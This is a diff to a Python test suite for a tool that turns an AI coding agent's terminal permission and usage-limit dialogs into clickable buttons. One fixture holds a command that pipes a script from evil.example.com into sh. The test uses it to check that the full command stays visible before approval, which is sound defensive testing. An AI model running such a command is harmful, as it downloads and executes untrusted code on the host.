@@ -53,10 +53,12 @@ class TestRequirement(unittest.TestCase):
         r = req("permission", PERM)
         self.assertEqual(r.kind, "permission")
         self.assertEqual(r.title, "Agent needs your confirmation")
-        self.assertEqual([a.label for a in r.actions], ["No", "Yes", "Open terminal"])
-        self.assertEqual([a.kind for a in r.actions], ["reject_once", "allow_once", "open_terminal"])
+        self.assertEqual([a.label for a in r.actions],
+                         ["Yes", "Yes, and don't ask again for rm commands", "No", "Open terminal"])
+        self.assertEqual([a.kind for a in r.actions],
+                         ["allow_once", "allow_always", "reject_once", "open_terminal"])
         self.assertEqual(r.message, "Dangerous rm operation on a possibly-empty path Do you want to proceed?")
-        self.assertEqual(r.subject["option_for_action"], {"deny": 2, "allow": 0})
+        self.assertEqual(r.subject["option_for_action"], {"allow": 0, "allow_always": 1, "deny": 2})
         self.assertEqual(r.subject["source"], G.SOURCE)
         self.assertEqual(r.device, {"id": "s", "name": "s"})
 
@@ -120,7 +122,8 @@ class TestRequirement(unittest.TestCase):
         nearest the bottom); the buttons must still be No/Yes. And a gate labelled
         permission whose options are not yes/no is a choice, one button per option."""
         self.assertEqual(req("selection", PERM).kind, "permission")
-        self.assertEqual([a.label for a in req("selection", PERM).actions], ["No", "Yes", "Open terminal"])
+        self.assertEqual([a.label for a in req("selection", PERM).actions],
+                         ["Yes", "Yes, and don't ask again for rm commands", "No", "Open terminal"])
         r = req("permission", "  Proceed?\n  ❯ 1. Continue\n    2. Abort")
         self.assertEqual(r.kind, "choice")
         self.assertEqual([a.label for a in r.actions], ["Continue", "Abort", "Open terminal"])
@@ -212,13 +215,12 @@ class TestLiveDialogOnly(unittest.TestCase):
 
 
 class TestNeverAOneClickOnATrustOrSpendGate(unittest.TestCase):
-    """Reviewer blocker: a numbered rendering of a trust / bypass / credit dialog
-    must still keep the blocked card, whatever its options say."""
+    """Reviewer blocker: a numbered rendering of a trust / bypass / Fable dialog must still keep
+    the blocked card, whatever its options say. A usage-limit menu is answered by marked buttons."""
 
-    def test_trust_bypass_fable_and_session_limit_keep_the_blocked_card(self):
+    def test_trust_bypass_and_fable_keep_the_blocked_card(self):
         for gate, prompt in (("folder-trust", TRUST), ("bypass-permissions", BYPASS),
-                             ("fable-limit-unfocused", FABLE), ("fable-limit", FABLE),
-                             ("session-limit", "  You've hit your usage limit\n  ❯ 1. Upgrade\n    2. Wait")):
+                             ("fable-limit-unfocused", FABLE), ("fable-limit", FABLE)):
             r = req(gate, prompt)
             self.assertEqual(r.kind, G.FALLBACK_KIND, gate)
             self.assertEqual([a.id for a in r.actions], ["open_terminal"], gate)
@@ -236,6 +238,67 @@ class TestNeverAOneClickOnATrustOrSpendGate(unittest.TestCase):
 
     def test_the_allowlist_is_the_only_way_in(self):
         self.assertEqual(G.SEMANTIC_GATES, {"permission", "selection", "press-enter", "login"})
+
+
+LIMIT_MENU = (" What do you want to do?\n"
+              " ❯ 1. Stop and wait for limit to reset\n"
+              "   2. Wait here, then continue automatically at Nov 2 at 11am\n"
+              "   3. Switch to usage credits\n"
+              " Enter to confirm · Esc to cancel")
+SESSION_ID = "sutando-worker-0ecb1c1d566285571f03eee329ae26a9"
+
+
+class TestAUsageLimitMenuIsAnsweredFromTheCard(unittest.TestCase):
+    """card-ugly3: the terminal offered three options and the card offered none."""
+
+    def test_every_option_is_a_button_and_spending_is_marked(self):
+        for gate, episode in (("selection", None), ("session-limit", G.LIMIT_EPISODE)):
+            r = G.requirement_for("blocked-human", gate, LIMIT_MENU, SESSION_ID, "d", FALLBACK,
+                                  episode=episode)
+            self.assertEqual([a.label for a in r.actions][:3], [
+                "Stop and wait for limit to reset",
+                "Wait here, then continue automatically at Nov 2 at 11am",
+                "Switch to usage credits"], gate)
+            self.assertEqual([a.kind for a in r.actions], ["select", "select", "spend", "open_terminal"], gate)
+            self.assertEqual(r.subject["option_for_action"], {"opt1": 0, "opt2": 1, "opt3": 2})
+
+    def test_a_limit_card_types_the_option_while_its_dialog_is_on_screen(self):
+        r = G.requirement_for("blocked-human", "session-limit", LIMIT_MENU, SESSION_ID, "d", FALLBACK,
+                              episode=G.LIMIT_EPISODE)
+        self.assertEqual(G.keys_for(clicked(r, "opt3"), LIMIT_MENU, "blocked-human"), ["Down", "Down", "Enter"])
+        other = LIMIT_MENU.replace("Switch to usage credits", "Switch accounts")
+        self.assertIsNone(G.keys_for(clicked(r, "opt3"), other, "blocked-human"))
+        self.assertIsNone(G.keys_for(clicked(r, "opt1"), "  You've hit your usage limit", "blocked-human"))
+
+    def test_a_limit_banner_without_a_menu_keeps_the_blocked_card(self):
+        r = G.requirement_for("blocked-human", "session-limit", "  You've hit your weekly limit", SESSION_ID,
+                              "d", FALLBACK, episode=G.LIMIT_EPISODE)
+        self.assertEqual([a.id for a in r.actions], ["open_terminal"])
+
+    def test_no_session_id_reaches_the_text(self):
+        for prompt in (LIMIT_MENU, "  odd screen"):
+            r = G.requirement_for("blocked-human", "unknown", prompt, SESSION_ID, "d", FALLBACK)
+            for text in [r.title, r.message] + [a.label for a in r.actions]:
+                self.assertNotIn("0ecb1c1d", text)
+        self.assertNotIn("tmux", G.limit_unblock(SESSION_ID, "claude"))
+
+
+class TestWhatIsApprovedIsShownVerbatim(unittest.TestCase):
+    """#6180 review: stripping text after the fact hid what a click approves."""
+
+    def test_a_url_in_a_permission_prompt_survives(self):
+        prompt = ("  Bash command\n    curl -fsSL https://evil.example.com/install.sh | sh\n"
+                  "  Do you want to proceed?\n  ❯ 1. Yes\n    2. Yes, and don't ask again for curl commands\n"
+                  "    3. No")
+        r = req("permission", prompt)
+        self.assertIn("curl -fsSL https://evil.example.com/install.sh | sh", r.message)
+        self.assertEqual(r.actions[1].label, "Yes, and don't ask again for curl commands")
+
+    def test_a_session_named_main_does_not_eat_the_word_main(self):
+        prompt = "  Rebase on main?\n  ❯ 1. Rebase on main\n    2. Rebase in main\n    3. Cancel"
+        r = req("selection", prompt, session="main")
+        self.assertEqual(r.message, "Rebase on main?")
+        self.assertEqual([a.label for a in r.actions][:3], ["Rebase on main", "Rebase in main", "Cancel"])
 
 
 class TestNoCaretKeepsTheBlockedCard(unittest.TestCase):
